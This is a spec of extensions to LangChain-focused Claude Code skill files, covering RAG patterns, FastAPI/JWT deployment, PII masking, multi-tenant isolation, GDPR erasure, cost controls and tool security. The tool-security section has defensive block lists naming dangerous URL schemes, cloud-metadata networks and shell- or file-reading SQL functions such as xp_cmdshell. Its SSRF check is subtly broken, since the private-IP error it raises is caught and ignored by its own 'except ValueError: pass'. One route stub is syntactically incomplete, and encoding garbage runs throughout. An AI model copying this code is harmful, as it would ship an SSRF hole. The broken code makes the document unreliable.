| Precision over recall | Very high | Pattern 11 (Cross-Encoder Re-Ranking) |
| Multiple query types | Adaptive | Pattern 12 (Adaptive RAG) |

**Pattern 9 "” Contextual Retrieval:**

Problem: chunks without surrounding context lose meaning. Solution: prepend a context summary generated by an LLM before embedding. Reduces retrieval failure rate by 49%.

```python
CONTEXT_PROMPT = ChatPromptTemplate.from_messages([
    ("system", "You are a document indexer. Given a document chunk and the full document, "
               "write a 1-2 sentence context that situates the chunk within the document. "
               "Be concise. Output only the context, no preamble."),
    ("human", "Full document:\n{full_document}\n\nChunk:\n{chunk}\n\nContext:"),
])

async def contextualize_chunks(chunks: list[Document], full_text: str) -> list[Document]:
    sem = asyncio.Semaphore(20)
    async def enrich(chunk):
        async with sem:
            ctx = await (CONTEXT_PROMPT | ChatAnthropic(
                model="claude-haiku-4-5", max_tokens=256
            ) | StrOutputParser()).ainvoke(
                {"full_document": full_text[:8000], "chunk": chunk.page_content}
            )
            enriched = Document(
                page_content=f"{ctx}\n\n{chunk.page_content}",
                metadata={**chunk.metadata, "original_chunk": chunk.page_content}
            )
            return enriched
    return list(await asyncio.gather(*[enrich(c) for c in chunks]))
```

**Pattern 10 "” Hybrid Search with RRF:**

RRF formula: `score(d) = Î£ 1/(k + rank(d))` where k=60. BM25-wins scenarios: exact terminology, product codes, names. Dense-wins scenarios: conceptual questions, paraphrases, semantic equivalence.

```python
def build_hybrid_retriever(docs: list[Document] | None, vectorstore, k: int = 6):
    bm25 = BM25Retriever.from_documents(docs or [], k=k)
    dense = vectorstore.as_retriever(search_kwargs={"k": k})
    return EnsembleRetriever(retrievers=[bm25, dense], weights=[0.5, 0.5])
```

**Pattern 11 "” Cross-Encoder Re-Ranking:**

Bi-encoder vs cross-encoder comparison: bi-encoder embeds query and doc independently (fast, approximate); cross-encoder attends over query+doc jointly (slow, accurate).

```python
def _cohere_reranker(initial_k: int, final_top_n: int):
    base = vectorstore.as_retriever(search_kwargs={"k": initial_k})
    reranker = CohereRerank(model="rerank-english-v3.0", top_n=final_top_n)
    return ContextualCompressionRetriever(base_compressor=reranker, base_retriever=base)

def _local_reranker(initial_k: int, final_top_n: int):
    base = vectorstore.as_retriever(search_kwargs={"k": initial_k})
    encoder = HuggingFaceCrossEncoder(model_name="cross-encoder/ms-marco-MiniLM-L-6-v2")
    reranker = CrossEncoderReranker(model=encoder, top_n=final_top_n)
    return ContextualCompressionRetriever(base_compressor=reranker, base_retriever=base)
```

`initial_k` sizing table:

| Corpus size | Recommended initial_k | Rationale |
|------------|----------------------|-----------|
| < 10K docs | 20 | Over-retrieve, re-rank to top 5 |
| 10K"“100K | 50 | Broader recall, re-rank is the filter |
| > 100K | 100 | ANN index misses, re-ranker recovers |

**Pattern 12 "” Adaptive RAG:**

```python
class QueryClassification(BaseModel):
    query_type: Literal["factual", "reasoning", "calculation", "current_events"]
    confidence: float  # 0.0-1.0; < 0.7 routes to fallback

def route_factual(state): ...      # plain vector store retrieval
def route_reasoning(state): ...    # ReAct agent with search_documents tool
def route_calculation(state): ...  # adds python_repl tool
def route_current_events(state):   # Tavily web search
def route_fallback(state): ...     # local docs first, then web search with disclaimer
```

LangGraph wiring: `classify â†’ conditional edges â†’ 5 route nodes â†’ END`

---

### Extension 4: lc:deploy "” FastAPI Integration + JWT Auth

**Extends:** `.claude/skills/lc-deploy/SKILL.md`
**Insert:** After existing Common Mistakes table, as Sections 6 and 7

**Section 6 "” FastAPI Integration:**

Key design decisions (explain each inline):
- `asynccontextmanager lifespan` "” graph compiled exactly once at process startup; `_graph` module-level reference shared across all requests
- `/invoke` endpoint: `thread_id` defaults to new `uuid4()` if omitted; `BackgroundTasks` for fire-and-forget analytics
- `/stream` endpoint: `astream_events(..., version="v2")`; three event kinds decoded; `await request.is_disconnected()` breaks generator on client drop; `EventSourceResponse` handles SSE framing
- `/health/live` "” zero logic, returns 200 unconditionally
- `/health/ready` "” two async checks: `SELECT 1` against PostgresSaver cursor + 3-second `httpx` HEAD to provider API; returns 503 if either fails
- `/metrics` "” `prometheus_client.generate_latest()` with `CONTENT_TYPE_LATEST`; `include_in_schema=False`
- CORS middleware "” `allow_origins` from settings field; `allow_credentials=True` required for browser JWT cookies
- `workers=1` note "” graph and DB pool are process-local; scale via multiple pods, not multiple workers per pod

**Section 7 "” JWT Authentication for LangGraph Platform:**

`langgraph.json` `"auth"` field "” correct object form:
```json
{
  "auth": {
    "path": "./src/auth.py:auth",
    "disable_studio_auth": false
  }
}
```

`@auth.authenticate` "” receives raw `Authorization` header; dispatches to `_decode_rs256` (JWKS, any OIDC) or `_decode_hs256` (shared secret); returns `MinimalUserDict` with `"identity"` (required) + `tenant_id`, `roles`, `display_name`, `email`.

JWKS cache "” `TTLCache(maxsize=1, ttl=600)` "” fetches at most once per 10 minutes.

`@auth.on` global handler "” injects `{"owner": user_id}` into every request's filter dict.

`@auth.on.threads.create` "” writes `owner` and `tenant_id` into thread metadata at creation.

`@auth.on.threads.read` "” admins bypass owner check; regular users get 403 if thread owner mismatches.

`@auth.on.assistants` "” limits create/update/delete to users with `admin` or `deployer` roles.

OIDC provider table: Okta, Azure AD, Auth0, Cognito, custom HS256 "” with exact JWKS URI patterns, audience format, issuer format.

---

### Extension 5: lc:monitor "” Self-Hosted Observability + PII Masking

**Extends:** `.claude/skills/lc-monitor/SKILL.md`
**Insert:** After existing Section 9, as Sections 10 and 11

**Section 10 "” Self-Hosted Observability Alternatives:**

**Mandatory disclosure block:**
```
LangSmith SaaS transmits all LLM I/O to US servers, triggering:
- GDPR Art. 46 cross-border transfer requirements for EU personal data
- HIPAA: standard plan does not satisfy BAA requirements
- MiFID II, NIS2: sector-specific prohibitions on US data transfer

LANGSMITH_HIDE_INPUTS=true / LANGSMITH_HIDE_OUTPUTS=true suppress I/O content
but do NOT suppress: metadata fields you attach, error messages, token counts,
run IDs, timestamps. This is a partial mitigation, not a compliance solution.
```

**Langfuse (most depth, closest feature parity):**
```yaml
# docker-compose.yml
services:
  langfuse-server:
    image: ghcr.io/langfuse/langfuse:latest
    depends_on:
      postgres: {condition: service_healthy}
    environment:
      DATABASE_URL: postgresql://langfuse:${POSTGRES_PASSWORD}@postgres:5432/langfuse
      NEXTAUTH_SECRET: ${NEXTAUTH_SECRET}
      SALT: ${SALT}
    healthcheck:
      test: ["CMD", "curl", "-f", "http://localhost:3000/api/health"]
    restart: unless-stopped
```

Per-request handler with explicit `flush_async()` calls. Migration path: import swap, env var swap, `create_feedback` â†’ `langfuse.score`, dataset export/import.

**Arize Phoenix (zero-dependency local):**
```python
from phoenix.otel import register
from openinference.instrumentation.langchain import LangChainInstrumentor
register(project_name="my-langchain-app", endpoint="http://localhost:6006/v1/traces")
LangChainInstrumentor().instrument()
```

**OTEL to Grafana Tempo:**
```python
from opentelemetry.sdk.trace.export import BatchSpanProcessor
from opentelemetry.exporter.otlp.proto.grpc.trace_exporter import OTLPSpanExporter
processor = BatchSpanProcessor(OTLPSpanExporter(endpoint="http://tempo:4317", insecure=True))
```

**Comparison table (8 dimensions):** self-hostable, GDPR-suitable, cost, persistent storage, feature parity vs LangSmith, setup complexity, dataset eval, prompt management.

**Section 11 "” PII Masking Tracer:**

Architecture diagram: masking is applied to data flowing to the observability backend only "” the LLM itself still receives the original prompt.

`PIIMaskingTracer` extends `BaseCallbackHandler` (not `LangChainTracer` "” coupled to LangSmith internals, not designed for subclassing). Overrides 8 hooks: sync + async variants of `on_llm_start`, `on_chat_model_start`, `on_llm_end`, `on_llm_error`. Both variants required "” LangChain dispatches async hook on `ainvoke()` calls.

Presidio in `ThreadPoolExecutor` with `loop.run_in_executor()` "” Presidio is CPU-bound (spaCy NER), blocking event loop would break async throughput.

All configuration via env vars: `PII_ENTITIES`, `PII_REPLACEMENT`, `PII_SCORE_THRESHOLD`, `PII_LANGUAGE`.

Performance table: 5-50ms per 500-token message. `presidio_client.py` HTTP client for >100 RPS case.

---

### Extension 6: lc:test "” Prompt Regression + RAGAS

**Extends:** `.claude/skills/lc-test/SKILL.md`
**Insert:** After existing Pattern 3 (or last existing pattern), as Sections 4 and 5

**Section 4 "” Prompt Regression Testing:**

```python
# push_baseline.py
from langsmith import Client
client = Client()
client.push_prompt("my-prompt/baseline", object=current_prompt)
```

```python
# regression_stats.py
def bootstrap_ci(scores: list[float], n_bootstrap: int = 2000, alpha: float = 0.05):
    """Percentile bootstrap "” no normality assumption needed for bounded [0,1] scores."""
    rng = np.random.default_rng(42)
    bootstrap_means = [
        np.mean(rng.choice(scores, size=len(scores), replace=True))
        for _ in range(n_bootstrap)
    ]
    lower = np.percentile(bootstrap_means, 100 * alpha / 2)
    upper = np.percentile(bootstrap_means, 100 * (1 - alpha / 2))
    return lower, upper

def compute_metric_delta(scores_a, scores_b):
    """Paired t-test "” paired design removes between-example variance, increases power."""
    diffs = [b - a for a, b in zip(scores_a, scores_b)]
    stat, p_value = scipy.stats.ttest_rel(scores_a, scores_b)
    return np.mean(diffs), p_value
```

Two-condition gate: fail if `delta < -0.05` OR if `delta < 0` AND `p_value > 0.05` (significance required only for negative deltas, not improvements).

Sample size reference: ~50 examples to detect a 0.10 delta at 80% power.

GitHub Actions job gated on `prompt-change` PR label.

**Section 5 "” RAGAS Evaluation:**

Plain-English explanations of all four metrics with score interpretation tables:

| Metric | 0.5 means | 0.8 means | Action at 0.5 |
|--------|-----------|-----------|---------------|
| faithfulness | Half of claims unsupported | Most claims grounded | Check retrieval |
| answer_relevancy | Partially off-topic | Mostly on-topic | Review prompt |
| context_precision | Many irrelevant chunks | Clean retrieval | Tune chunk size |
| context_recall | Missing key information | Good coverage | Increase top_k |

When to run: faithfulness + answer_relevancy on every RAG PR (reference-free); all four on corpus re-index.

```python
# ragas_langsmith.py
@traceable
async def traced_rag(question: str) -> dict:
    result = await rag_chain.ainvoke({"question": question})
    return result

async def evaluate_with_feedback(dataset: list[dict]):
    for item in dataset:
        with get_openai_callback() as cb:
            result = await traced_rag(item["question"])
            run_id = get_current_run_tree().id
        scores = await evaluate_single(item, result)
        for metric, score in scores.items():
            client.create_feedback(run_id, key=metric, score=score)
```

CI gate: `sys.exit(1)` if any metric below threshold. Prints actionable suggestions per failed metric before exiting.

GitHub Actions job gated on `rag-change` label or changes to `chain.py`/`retriever.py`.

---

### Extension 7: lc:memory "” Multi-Tenant Isolation + Right to Erasure

**Extends:** `.claude/skills/lc-memory/SKILL.md`
**Insert:** After existing last section, as Sections 8 and 9

**Section 8 "” Multi-Tenant Isolation:**

**8.1 Thread ID convention:**
```python
def make_thread_id(tenant_id: str, user_id: str, session_id: str | None = None) -> str:
    sid = session_id or secrets.token_urlsafe(16)
    return f"tenant:{tenant_id}:user:{user_id}:session:{sid}"

def parse_thread_id(thread_id: str) -> dict:
    parts = thread_id.split(":")
    return {"tenant_id": parts[1], "user_id": parts[3], "session_id": parts[5]}
```

**8.2 TenantIsolatedCheckpointer:** Full `BaseCheckpointSaver` subclass wrapping any inner saver. Implements both sync (`get_tuple`, `list`, `put`, `put_writes`) and async (`aget_tuple`, `alist`, `aput`, `aput_writes`) interfaces. `_assert_ownership` raises `PermissionError` on tenant mismatch.

**8.3 PostgreSQL Row-Level Security:**
```sql
ALTER TABLE checkpoints ADD COLUMN tenant_id TEXT
    GENERATED ALWAYS AS (split_part(thread_id, ':', 2)) STORED;
ALTER TABLE checkpoints ENABLE ROW LEVEL SECURITY;
CREATE POLICY tenant_isolation ON checkpoints
    USING (tenant_id = current_setting('app.current_tenant_id', true));
```

Python: set `app.current_tenant_id` GUC via asyncpg before each checkpoint operation.

**8.4 Vector store isolation:** Decision table "” < 1,000 tenants: collection-per-tenant; > 1,000: metadata filter. Both strategies fully implemented with GDPR erasure.

**8.5 Store API namespace convention:** `(tenant_id, user_id, feature_name)` three-tuple. Sentinel values `_shared` (tenant-wide) and `_global` (cross-tenant).

**8.6 Per-tenant token quota:** `CostTrackingCallback(AsyncCallbackHandler)`. `on_llm_start` reads Redis counter, raises before API call if over quota. `on_llm_end` atomically increments with `INCRBYFLOAT`. Key: `token_quota:{tenant_id}:{YYYY-MM}` with 35-day TTL (set once with `nx=True`).

**Section 9 "” Right to Erasure:**

**9.1 Audit table:**
```sql
CREATE TABLE user_data_erasure_log (
    erasure_record_id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
    tenant_id TEXT NOT NULL,
    user_id TEXT NOT NULL,
    requested_at TIMESTAMPTZ NOT NULL DEFAULT now(),
    completed_at TIMESTAMPTZ,
    checkpoints_deleted INT DEFAULT 0,
    vector_docs_deleted INT DEFAULT 0,
    errors_json JSONB DEFAULT '[]'::jsonb,
    status TEXT CHECK (status IN ('pending', 'completed', 'partial', 'failed'))
);
REVOKE UPDATE ON user_data_erasure_log FROM app_role;
REVOKE DELETE ON user_data_erasure_log FROM app_role;
```

**9.2 `delete_user_data` "” complete implementation:**
```python
async def delete_user_data(
    user_id: str, tenant_id: str, pool: asyncpg.Pool,
    vectorstore: DeletableVectorStore, dry_run: bool = False
) -> ErasureReceipt:
    thread_pattern = f"tenant:{tenant_id}:user:{user_id}:%"
    # 1. PostgreSQL transaction: checkpoints + checkpoint_writes + checkpoint_blobs + audit INSERT
    # 2. Vector store delete (outside transaction, best-effort)
    # 3. Return ErasureReceipt with UUID cross-reference
```

Erasure order rationale: DB transaction first (atomic, auditable); vector store outside transaction (cannot be rolled back, best-effort with error logging).

**9.3 Dry run:** Counts rows without deleting. No audit record inserted.

**9.4 30-day compliance checklist:** Maps each GDPR obligation to implementation step. Includes backup erasure process and re-erasure request handling.

**9.5 What NOT to delete:**

| Keep | Delete | Reason |
|------|--------|--------|
| `erasure_audit` rows | Checkpoint data | Legal obligation to prove erasure |
| Aggregated metrics | Raw message content | No PII in aggregates |
| Billing records | Conversation history | Financial legal basis |
| Error logs (no PII) | Vector embeddings | No personal data in error logs |

---

### Extension 8: lc:tools "” Security Patterns (Section 9)

**Extends:** `.claude/skills/lc-tools/SKILL.md`
**Insert:** After existing last section, as Section 9

**Section 9 "” Tool Security (5 subsections + checklist):**

**9.1 SSRF Prevention:**
```python
import ipaddress, httpx
from urllib.parse import urlparse

BLOCKED_SCHEMES = {"file", "gopher", "ftp", "data", "dict", "ldap", "ldaps"}
PRIVATE_NETWORKS = [
    ipaddress.ip_network("10.0.0.0/8"),
    ipaddress.ip_network("172.16.0.0/12"),
    ipaddress.ip_network("192.168.0.0/16"),
    ipaddress.ip_network("127.0.0.0/8"),
    ipaddress.ip_network("169.254.0.0/16"),  # link-local / cloud metadata
    ipaddress.ip_network("100.64.0.0/10"),   # shared address space
    ipaddress.ip_network("::1/128"),
    ipaddress.ip_network("fc00::/7"),
]

def _assert_safe_url(url: str) -> None:
    parsed = urlparse(url)
    if parsed.scheme.lower() in BLOCKED_SCHEMES:
        raise ValueError(f"Blocked scheme: {parsed.scheme}")
    try:
        ip = ipaddress.ip_address(parsed.hostname)
        if any(ip in net for net in PRIVATE_NETWORKS):
            raise ValueError("Private/reserved IP address blocked")
    except ValueError:
        pass  # hostname, not literal IP "” DNS resolution checked post-request
```

Check runs before request and after final redirect.

**9.2 Path Traversal Prevention:**
```python
from pathlib import Path

def _assert_safe_path(base_dir: Path, user_path: str) -> Path:
    if ".." in Path(user_path).parts:
        raise ValueError("Path traversal attempt detected")
    resolved = (base_dir / user_path).resolve()
    try:
        resolved.relative_to(base_dir.resolve())
    except ValueError:
        raise ValueError("Path outside allowed directory")
    return resolved
    # Error messages deliberately omit resolved path to avoid leaking filesystem layout
```

**9.3 SQL Injection Prevention:**
```python
import sqlglot
from sqlglot.errors import ErrorLevel

BLOCKED_FUNCTIONS = {"load_extension", "xp_cmdshell", "pg_read_file", "pg_write_file"}
SYSTEM_TABLES = {"sqlite_master", "information_schema", "pg_catalog", "pg_shadow"}

def _validate_sql(sql: str, dialect: str = "postgres") -> None:
    statements = sqlglot.parse(sql, dialect=dialect, error_level=ErrorLevel.RAISE)
    if len(statements) > 1:
        raise ValueError("Multiple statements not allowed")
    stmt = statements[0]
    if not isinstance(stmt, sqlglot.exp.Select):
        raise ValueError(f"Only SELECT allowed, got {type(stmt).__name__}")
    # Walk AST for UNION, system tables, blocked functions
```

**9.4 Code Execution Sandboxing:**

E2B sandbox:
```python
from e2b_code_interpreter import AsyncSandbox

@tool
async def sandboxed_python(code: str) -> str:
    """Execute Python code in an isolated E2B sandbox."""
    async with AsyncSandbox() as sandbox:
        result = await sandbox.run_code(code)
        if result.error:
            raise ToolException(f"Code error: {result.error.value}")
        return "\n".join(str(o) for o in result.results) or "(no output)"
```

Decision table:

| Option | Sandboxing | Cost | Stateful | Best for |
|--------|-----------|------|---------|---------|
| PythonREPLTool | None | Free | Yes | Never in production |
| E2B | Full VM | ~$0.001/run | Yes (session) | Production untrusted code |
| BetaCodeExecutionTool | Anthropic-managed | API cost | No | Anthropic-only projects |
| Custom Docker | Container | Infrastructure cost | Configurable | Existing container platform |

**9.5 Tool Output Size Limiting:**
```python
MAX_TOOL_OUTPUT_BYTES = 50_000

def truncate_str(text: str, max_bytes: int = MAX_TOOL_OUTPUT_BYTES) -> str:
    encoded = text.encode("utf-8")
    if len(encoded) <= max_bytes:
        return text
    return encoded[:max_bytes].decode("utf-8", errors="ignore") + \
           f"\n[TRUNCATED: output exceeded {max_bytes} bytes]"

def wrap_tool_result(content: str) -> str:
    """Delimit untrusted content to reduce prompt-stuffing effectiveness."""
    return f"<tool_result>\n{content}\n</tool_result>"

class SizeLimitedToolNode(ToolNode):
    """ToolNode that applies a hard byte cap to every ToolMessage."""
    def _run_tool(self, tool_call, config):
        result = super()._run_tool(tool_call, config)
        for msg in result.get("messages", []):
            if hasattr(msg, "content"):
                msg.content = truncate_str(str(msg.content), MAX_TOOL_OUTPUT_BYTES)
        return result
```

**9.6 Security Checklist (15 rows)** covering every requirement from 9.1-9.5.

---

### Extension 9: lc-coder / lc-reviewer "” Security Checklist Items 16-20

**Extends:** `.claude/skills/lc-coder/AGENT.md` and `.claude/skills/lc-reviewer/AGENT.md`

See "New lc-coder Checklist Items" and "New lc-reviewer Dimension 3 Expansions" sections below.

---

### Extension 10: lc:start "” Disclosures + Provider Selection + Learning Paths

**Extends:** `.claude/skills/lc-start/SKILL.md` (or equivalent start skill file)
**Insert:** Three additions as described below

**Addition 1 "” LangSmith Data Residency Disclosure (end of STEP 10):**

After the existing "Press Enter to continue." wait, and ONLY if `LANGSMITH_API_KEY` is set, display:

```
Important: LangSmith sends all your LLM inputs and outputs to LangChain Inc.
servers in the United States.

  - Every prompt, every response, every document chunk you retrieve is
    transmitted to and stored on LangChain Inc. infrastructure.
  - If you are processing EU personal data this is a GDPR cross-border
    transfer and requires a legal basis (SCCs, adequacy decision, or consent).
  - If you are processing US health data this may trigger HIPAA obligations
    that LangSmith's standard plan does not satisfy.

Before going to production, run: lc:compliance

Options:
  1 / "continue" "” Continue with LangSmith as-is (fine for development)
  2 / "mask"     "” Add LANGSMITH_HIDE_INPUTS=true + LANGSMITH_HIDE_OUTPUTS=true
                   to .env (suppresses content, not metadata)
  3 / "monitor"  "” Route to lc:monitor for self-hosted alternatives
```

If user chooses "mask": append both env vars to `.env` and `.env.example`, print confirmation, proceed.
If user chooses "monitor": invoke `lc:monitor`, do not continue to STEP 11.

**Addition 2 "” Provider Selection (insert as STEP 1b between STEP 1 and STEP 2):**

Present 5-option menu:
1. Anthropic (Claude) "” Recommended
2. OpenAI (GPT-4o)
3. Azure OpenAI
4. Ollama (local, no API key)
5. I don't have any yet "” guide me to free Anthropic access

For options 2-4, apply complete code swap tables covering: import swap, constructor swap, variable name swap in generated code, `pyproject.toml` dependency swap, `.env.example` key swap, `main()` import check swap, RAG embeddings swap (if applicable).

Option 5: walk user through `console.anthropic.com` signup, prompt for API key paste, write directly to `.env`.

**Addition 3 "” Learning Path Tiers (end of each GOAL block in STEP 12):**

After each GOAL-specific skill invocation, display the three-tier learning path:

```
BEGINNER PATH:   lc:start â†’ lc:lcel â†’ lc:agent â†’ lc:memory â†’ lc:deploy â†’ lc:test
INTERMEDIATE:    lc:graph â†’ lc:rag â†’ lc:context-engineer â†’ lc:tools â†’ lc:monitor
ADVANCED:        lc:guardrails â†’ lc:resilience â†’ lc:audit â†’ lc:compliance â†’ lc:multimodal
```

With one-line description of each skill and a "Your goal suggests starting with: <skill>" pointer based on GOAL value.

---

### Extension 11: lc:debug "” Studio Visual Debugging + Time-Travel

**Extends:** `.claude/skills/lc-debug/SKILL.md`
**Insert:** Phase 0.5 before Step 0; Phase 8 before Debugging Tools Reference table

**Phase 0.5 "” Visual Debugging with LangGraph Studio (Try This First):**

```bash
pip install "langgraph[cli]"
# langgraph.json minimum:
# {"graphs": {"agent": "./src/graph.py:graph"}}
langgraph dev  # starts at http://localhost:2024, hot-reload enabled
```

Studio panels: canvas (graph topology), node list, edge list, state inspector, thread selector.

**Step-through procedure:**
1. Open localhost:2024 in browser
2. Click "New Thread" in thread selector
3. Send a test message in the input panel
4. Watch nodes highlight as they execute
5. Click a red (failed) node to see inline traceback

**State injection (pencil icon):**
1. Open state inspector for the failing thread
2. Click pencil icon on any field
3. Edit the JSON value
4. Click "Resume" to continue from current node with injected state

Use cases: replace bad tool result, force a branch, inject mock LLM response.

**Breakpoints:**
```python
graph = workflow.compile(
    checkpointer=checkpointer,
    interrupt_before=["tool_node"],   # pause before tool execution
    interrupt_after=["agent"],        # pause after agent decides
)
# Resume:
graph.invoke(None, config)           # continue with current state
graph.update_state(config, {"messages": [corrected_msg]})
graph.invoke(None, config)           # continue with patched state
```

**Phase 8 "” Time-Travel Debugging:**

`StateSnapshot` schema (every field explained): `values`, `next`, `config`/`checkpoint_id`, `metadata`/`step`/`source`/`writes`, `created_at`, `parent_config`, `tasks`, `interrupts`.

Core time-travel workflow:
```python
# 1. Get full history
history = list(graph.get_state_history(config))

# 2. Find checkpoint before the failing node
target = next(
    s for s in history
    if s.next == ("failing_node_name",)
)

# 3. Patch state at that checkpoint
graph.update_state(
    target.config,
    {"problematic_field": corrected_value}
)

# 4. Resume from patched checkpoint
result = graph.invoke(None, target.config)
```

Common use cases table: tool garbage, wrong branch, infinite loop counter reset, malformed subgraph output, re-run from known-good point.

Async variants: `aget_state_history`, `aupdate_state`.

Hard limits: cannot un-run side effects (API calls, DB writes already executed), cannot patch across threads, requires a checkpointer (MemorySaver works for dev).

---

### Extension 12: /lc-scaffold "” New Types and Flags

**Extends:** `.claude/skills/lc-scaffold/SKILL.md`
**Insert:** Add items 10-14 to menu; add flags section after menu; add template sections

**Menu additions (items 10-14):**

```
10. fastapi-streaming  "” FastAPI server with /invoke, /stream (SSE), /health/*, /metrics
11. chainlit           "” Chainlit chat app with streaming, file upload, OAuth
12. sql-agent          "” Text-to-SQL agent with validation loop and safety guards
13. multimodal         "” Multimodal agent with image/PDF/audio tool support
14. guardrails-layer   "” Input sanitization, cost circuit breaker, output PII redaction
```

**New flags:**
```
--provider <name>      Swap all provider code to: anthropic|openai|azure|bedrock|gemini|ollama
--gdpr                 Inject src/privacy.py with PII masking, pseudonymization, erasure stub
--devcontainer         Add .devcontainer/devcontainer.json for VS Code Dev Containers
```

**Type 10 "” fastapi-streaming** generates `src/schemas.py` + `src/server.py`:
- `lifespan` graph init (compiled once at startup)
- `POST /invoke` with `InvokeRequest`/`InvokeResponse` Pydantic models
- `POST /stream` with SSE via `AsyncIterator` and `EventSourceResponse`
- `GET /health/live` (zero logic, 200 always)
- `GET /health/ready` (DB + provider connectivity checks, 503 on failure)
- `GET /metrics` (Prometheus `generate_latest()`, `include_in_schema=False`)
- CORS middleware

**Type 11 "” chainlit** generates `app.py` + `chainlit.md`:
- `@cl.on_chat_start` with `uuid`-based thread isolation
- `@cl.on_message` with `astream` token streaming via `response_msg.stream_token()`
- File upload handler for PDF/image/text
- `AsyncLangchainCallbackHandler`
- Optional OAuth stub

**Type 12 "” sql-agent** generates `sql_agent.py`:
- `SqlAgentState(TypedDict)` with 6 fields
- 6-node graph: `load_schema â†’ nl_to_sql â†’ validate â†’ execute â†’ format` + retry loop
- `sqlglot.parse()` AST syntax check + SELECT-only enforcement
- `SQLDatabase.from_uri()` read-only
- `MAX_RETRIES` guard

**Type 13 "” multimodal** generates `multimodal_agent.py`:
- `encode_image_to_b64()` with magic-byte fallback MIME detection
- `image_content_block()` and `image_url_content_block()` for Anthropic content-block format
- `load_document_images()` (pypdf optional)
- `multimodal_node` builds mixed `HumanMessage`

**Type 14 "” guardrails-layer** generates `guardrails.py`:
- `sanitize_input()` with injection pattern list + truncation
- `CostCircuitBreaker` class with per-day spend tracking
- `ToolOutputSanitizer` with secret-pattern stripping
- `redact_pii_from_output()`

**`--provider` flag:** Substitution table for all 6 providers covering import, class name, default model string, extra `.env.example` keys.

**`--gdpr` flag:** Injects `src/privacy.py` with `mask_pii()`, `pseudonymise()`, `sanitize_for_tracing()`, `LANGSMITH_DISCLOSURE` string, `handle_erasure_request()` async stub. Adds `LANGSMITH_HIDE_INPUTS`, `PSEUDONYMISE_SALT` to `.env.example`.

**`--devcontainer` flag:** Injects `.devcontainer/devcontainer.json` with Python 3.11 base, `uv` install, ports 2024 and 8000 forwarded, VS Code extensions (Pylance, Ruff, mypy, black, TOML, YAML).

---

### Extension 13: Cost Management "” lc:monitor Section 12 + lc:lcel Part 10

**Extends:** `.claude/skills/lc-monitor/SKILL.md` (Section 12) and `.claude/skills/lc-lcel/SKILL.md` (Part 10)

**lc:monitor Section 12 "” Cost Management and Budget Controls:**

Pricing reference table (claude-sonnet-4-6, claude-haiku-4-5, gpt-4o, gpt-4o-mini, others).

```python
# cost_metering.py
COST_PER_1K: dict[str, dict[str, float]] = {
    "claude-sonnet-4-6": {"input": 0.003, "output": 0.015},
    "claude-haiku-4-5": {"input": 0.00025, "output": 0.00125},
    "gpt-4o": {"input": 0.005, "output": 0.015},
    "gpt-4o-mini": {"input": 0.00015, "output": 0.0006},
}

class CostTrackingCallback(BaseCallbackHandler):
    def on_llm_end(self, response, **kwargs):
        model = response.llm_output.get("model_name", "unknown")
        usage = response.llm_output.get("usage", response.llm_output.get("token_usage", {}))
        cost = compute_cost(model, usage.get("prompt_tokens", 0), usage.get("completion_tokens", 0))
        redis.incrbyfloat(f"cost:{self.tenant_id}:{date.today():%Y-%m-%d}", cost)
```

```python
# budget_gate.py
class CostBudgetExceeded(Exception): ...

def check_budget_node(state: AgentState, config: RunnableConfig) -> AgentState:
    tenant_id = config["configurable"].get("tenant_id", "default")
    daily_cost = float(redis.get(f"cost:{tenant_id}:{date.today():%Y-%m-%d}") or 0)
    if daily_cost >= DAILY_BUDGET_USD:
        raise CostBudgetExceeded(f"Daily budget ${DAILY_BUDGET_USD} exceeded")
    return state
```

```python
# model_routing.py
class TaskComplexity(str, Enum):
    SIMPLE = "simple"      # â†’ claude-haiku-4-5
    STANDARD = "standard"  # â†’ claude-sonnet-4-6
    COMPLEX = "complex"    # â†’ claude-sonnet-4-6 with extended thinking

async def auto_route(query: str) -> str:
    """Use cheap Haiku to classify query complexity, then route to appropriate model."""
    classification = await (CLASSIFY_PROMPT | ChatAnthropic(
        model="claude-haiku-4-5", max_tokens=10
    ) | StrOutputParser()).ainvoke({"query": query})
    return COMPLEXITY_TO_MODEL[TaskComplexity(classification.strip().lower())]
```

Shadow comparison: `asyncio.gather` runs both models simultaneously, LLM-as-judge scores quality, LangSmith feedback logging with promotion decision criteria.

**lc:lcel Part 10 "” Semantic Caching:**

```python
from langchain.globals import set_llm_cache
from langchain_community.cache import RedisSemanticCache
from langchain_openai import OpenAIEmbeddings

cache = RedisSemanticCache(
    redis_url=os.getenv("REDIS_URL"),
    embedding=OpenAIEmbeddings(model="text-embedding-3-small"),
    score_threshold=0.95,  # cosine similarity threshold
)
set_llm_cache(cache)
# Cache key: SHA256(prompt + model + temperature + stop)
# Score threshold: 0.95 = near-identical queries only
# Cache bypass: chain.invoke(input, config={"cache": False})
```

Cost savings: at 60% hit rate, claude-sonnet-4-6 at 1M tokens/day = ~$5,400/month saved.

When NOT to cache: personalized responses, real-time data, creative tasks, low-volume apps, confidential data mixing across tenants.

---

### Extension 14: lc:deploy "” K8s Health Probes + Structured Logging

**Extends:** `.claude/skills/lc-deploy/SKILL.md`
**Insert:** After existing Section 7 (JWT Auth), as Sections 8 and 9

**Section 8 "” K8s Health Probes:**

Why the split matters:

| Probe | Question | Failure action |
|-------|----------|---------------|
| `livenessProbe` | Is the process alive? | K8s restarts pod |
| `readinessProbe` | Can pod serve traffic? | K8s removes from Service endpoints |
| `startupProbe` | Has app finished starting? | Delays liveness/readiness until passes |

```python
# src/health.py
router = APIRouter()

@router.get("/health/live")
async def liveness():
    return {"status": "alive"}

@router.get("/health/ready")
async def readiness():
    checks = {}
    # Check 1: PostgresSaver connection pool
    try:
        async with _checkpointer._pool.acquire() as conn:
            await conn.execute("SELECT 1")
        checks["database"] = "ok"
    except Exception as e:
        checks["database"] = str(e)
    # Check 2: Provider API reachability
    try:
        async with httpx.AsyncClient(timeout=3.0) as client:
            r = await client.head("https://api.openai.com/v1/models")
            checks["llm_provider"] = "ok" if r.status_code in (200, 401) else "degraded"
    except Exception:
        checks["llm_provider"] = "unreachable"
    status_code = 200 if all(v == "ok" for v in checks.values()) else 503
    return JSONResponse({"status": "ready" if status_code == 200 else "degraded", "checks": checks}, status_code=status_code)
```

```yaml
# k8s/deployment.yaml probe block
startupProbe:
  httpGet: {path: /health/live, port: 8000}
  initialDelaySeconds: 5
  periodSeconds: 6
  failureThreshold: 30   # 3-minute startup budget

livenessProbe:
  httpGet: {path: /health/live, port: 8000}
  initialDelaySeconds: 10
  periodSeconds: 15
  timeoutSeconds: 5
  failureThreshold: 3

readinessProbe:
  httpGet: {path: /health/ready, port: 8000}
  initialDelaySeconds: 5
